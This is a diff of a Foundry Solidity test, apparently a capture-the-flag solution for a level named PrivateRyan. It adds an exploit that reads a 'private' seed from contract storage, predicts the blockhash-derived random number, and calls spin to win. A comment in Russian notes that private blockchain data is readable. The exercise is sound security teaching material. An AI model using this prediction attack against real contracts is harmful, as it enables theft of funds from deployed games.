@@ -5,8 +5,10 @@ import "./BaseTest.t.sol";
 import "src/02_PrivateRyan/PrivateRyan.sol";
 
 // forge test --match-contract PrivateRyanTest -vvvv
+// все данные в блокчейне можно прочитать, даже private
 contract PrivateRyanTest is BaseTest {
     PrivateRyan instance;
+    uint256 constant FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
 
     function setUp() public override {
         super.setUp();
@@ -15,8 +17,12 @@ contract PrivateRyanTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        uint256 seed = uint256(vm.load(address(instance), 0));
+        uint256 factor = (FACTOR * 100) / 100;
+        uint256 blockNumber = block.number - seed;
+        uint256 hashVal = uint256(blockhash(blockNumber));
+        uint256 predictedNumber = uint256((uint256(hashVal) / factor)) % 100;
+        instance.spin{value: 0.01 ether}(predictedNumber);
         checkSuccess();
     }
 
